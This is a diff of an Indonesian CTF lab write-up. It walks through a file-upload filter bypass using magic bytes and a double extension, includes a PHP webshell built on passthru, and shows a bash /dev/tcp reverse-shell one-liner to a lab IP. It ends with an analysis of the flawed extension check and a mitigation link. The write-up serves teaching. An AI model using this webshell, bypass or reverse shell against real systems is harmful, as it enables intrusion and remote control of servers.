@@ -6,7 +6,7 @@
 ## Learning Outcomes
 
 - Understanding GET and POST parameters
-- Bypass file upload 
+- Bypassing a file upload
 - Vulnerability Analysis by me!
 
 ## Summary
@@ -22,37 +22,41 @@
 
 Pada task kali ini, diberikan suatu ID = ODIzODI5MTNiYmYw.
 
-ID tersebut digunakan untuk mengakses page berikut.
+ID tersebut digunakan untuk mengakses/login pada sebuah website dari mesin yang di deploy. 
 
 ![216ec1cef8706fce53b9beb88299a35d.png](./_resources/43573e0df86d4193b3e3085d5cec04d9.png)
+
+Tertulis cara untuk mengaksesnya adalah mengirimkan *request* dengan parameter `ID` (GET).
 
 > Pengingat:
 >- Metode POST request : data yang dikirim diikutkan body request (tidak tampak di URL, namun bisa di intercept)
 >- Metode GET request : data yang dikirim terlihat pada URL berupa parameter
 >   - Setiap nilai parameter dipisah dengan &
 
-
-Caranya adalah menambahkan query (tanda tanya `?`) dengan parameter `id=value`.
-
+Maka yang perlu dilakukan adalah menambahkan `?id=ODIzODI5MTNiYmYw` pada alamat URLnya :
+```
 http://10.10.43.11/?id=ODIzODI5MTNiYmYw
+```
+
+Dan berhasil masuk dengan tampilan berikut.
 
 ![c196cb699c437c800581393bd693bed8.png](./_resources/369e7c46d6a247a68e2c56a6520e78fc.png)
 
-Dari sini upload file dapat dilakukan, dimana ekstensi yang diminta adalah jpeg, jpg, dan png.
+Pada halaman ini, upload file dapat dilakukan dan ekstensi file yang diminta adalah jpeg, jpg, dan png.
 
 ![6fc7281b9f43b120870d2661a7f33cc4.png](./_resources/4e66d9a56752494a974331937c6adcc0.png)
 
-Berikut adalah list common uploads directory  
-- /uploads
-- /images
-- /media
-- /resources
+> Common upload directory list :
+> - /uploads
+> - /images
+> - /media
+> - /resources
 
-File yang di upload berada pada direktori /uploads.
+Diketahui file yang di *upload* berada pada salah satu *common upload directory*, yaitu `/uploads/`.
 
-Selanjutnya adalah mempersiapkan shell/backdoor web untuk di upload pada direktori tersebut.
+Dari sini, kita bisa mencoba untuk meng-*upload* webshell.
 
-Disini saya menggunakan webshell yang merupakaan bawaan dari Kali Linux.
+Saya menggunakan webshell bawaan dari Kali Linux yang terdapat pada directory /usr/share/webshells/
 
 ```
 <MAGICBYTES>
@@ -62,30 +66,33 @@ Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
 Output:<br />
 <pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
 ```
+
 > *magic bytes : https://en.wikipedia.org/wiki/List_of_file_signatures*
 
-Magicbytes digunakan untuk mengelabui/membypass uploader, meyakinkan bahwa yang diupload adalah file jpeg bukan webshell/backdoor.  
+Magicbytes dapat digunakan untuk mem-*bypass* *upload filter*. Sebagai contoh, disini file yang berisi kode program php tetapi karena terdapat *magicbytes* dari file .jpeg, maka yang terbaca adalah .jpeg.
 
 ![2b1f5c137288962d3e193c0bce5093cc.png](./_resources/0aac928f2ead427d9cb1805986af8448.png)
 
-Namun hal tersebut tidak berhasil. Tetapi ketika dibalik menjadi shell.jpg.php, webshell berhasil di upload.
+Namun hal tersebut tidak berhasil.  
+
+Tetapi, ketika nama file dibalik menjadi shell.jpg.php, bukan shell.php.jpg, webshell tersebut berhasil di *upload*.
 
 ![759dccab6add96541caf6777c2e0ce7a.png](./_resources/f4b4e9df972a42648980fde77011e691.png)
 
-Sekarang Remote Code Execution (RCE) dapat dilakukan
+Dengan begitu, ***R**emote **C**ode **E**xecution* (RCE) dapat dilakukan.
 
 ![8a1272d07209ebe2ffba128811fb2302.png](./_resources/c93d20e6d336472db6aa54a7534f2a09.png)
 
-Dengan adanya RCE, kita bisa mendapatkan reverse shell untuk masuk ke dalam system.
+Melalui RCE ini, kita bisa mendapatkan *reverse shell* untuk masuk ke dalam system.
 
 ```
 bash -i >& /dev/tcp/10.9.30.115/9000 0>&1
 ```
  Sedikit penjelasan :
 - bash -i >& /dev/tcp/10.9.30.115/9000   
-" Berikan interactive shell dari bash melalui TCP ke 10.9.30.115 di port 9000 "
+Mudahnya dibaca : "Berikan interactive shell dari bash melalui TCP ke 10.9.30.115 di port 9000"
 - 0>&1  
-" Redirect stdin (input) ke stdout (ouput) ", maksudnya setiap perintah yang diketik dalam reverse shell tersebut, maka akan di ditampilkan kembali ke terminal
+"Redirect stdin (input) ke stdout (ouput)", maksudnya setiap perintah yang diketik dalam reverse shell tersebut, maka akan di ditampilkan kembali ke terminal
 
 Contoh gambar  
 
@@ -97,20 +104,29 @@ pwd             <-- ini stdout
 
 ![8525accc17e0b613db09cbaca471ce8e.png](./_resources/c6f980247a834023bb9cb5fd3b73424c.png)
 
-Flag ditemukan pada /var/www/flag.txt
+Pencarian kata flag secara rekursif dapat dilakukan dengan perintah berikut.
 
 ```
 find / -type f 2>/dev/null | grep flag
 ```
 
+Flag ditemukan pada direktori `/var/www/` 
+
 ![a6306e4a9eeaddec28e4128fd6c846b6.png](./_resources/63d77db614f4487590f9840055323679.png)
+
+Task telah selesai, tetapi pada bagian berikut, saya mencari tahu bagaimana webshell yang diupload dapat lolos dengan mengubah susunan ekstensinya.
 
 
 ## Vulnerability Analysis & Mitigation
 
+
 ### Bypass upload filter 
 
-/var/www/html/upload.php
+File yang berisikan kode program untuk melakukan *upload* terdapat pada direktori
+`/var/www/html/upload.php`
+
+Berikut isi kodenya :
+
 ```
 <?php
         try{
@@ -155,7 +171,7 @@ find / -type f 2>/dev/null | grep flag
 ?>
 ```
 
-Baris code berikut yang membuat shell yang di upload lolos.
+Baris kode berikutlah yang membuat webshell yang di *upload* dapat lolos :
 
 ````
 $ext  = trim(explode(".", $data["name"])[1], "\n");
@@ -167,18 +183,18 @@ $ext  = trim(explode(".", $data["name"])[1], "\n");
 
 ````
 
-Berikut adalah contoh data yang dikirim ketika melakukan file upload
+Lalu ini adalah contoh request yang dikirim ketika melakukan *upload* file.
 
 ![data.png](./_resources/data.png)
 
-data = {"name":"shell.php", "id":"ODIzODI5MTNiYmYw", ...etc}
-
-Sesampainya pada baris ini
+Pada baris kode ini :
 
 ```
 $ext  = trim(explode(".", $data["name"])[1], "\n"); 
 ```
-Nama shell.php dipecah/explode dengan titik sebagai pemisahnya menjadi
+Bagian `data = {"name":"shell.php", ..., ...}` 
+
+Akan diambil dan dipecah/explode menjadi array dengan titik sebagai pemisahnya (*delimiter*) menjadi :
 
 - shell <-- $data["name"][0] 
 - php   <-- $data["name"][1] - diambil dan tidak lolos filter
@@ -189,11 +205,11 @@ Maka ketika filename diberi nama shell.jpg.php
 - jpg   <-- $data["name"][1] - diambil dan lolos filter
 - php   <-- $data["name"][2] - tidak dianggap!
 
-Berikut hasilnya 
+Berikut gambarannya eksekusinya yang meloloskan ekstensi .php.
 
 ![vuln.png](./_resources/vuln.png)
 
-Contoh mitigasi 
+Contoh mitigasi dapat dilihat pada link berikut.
 
 https://stackoverflow.com/questions/14789206/if-statement-to-filter-file-extensions
 
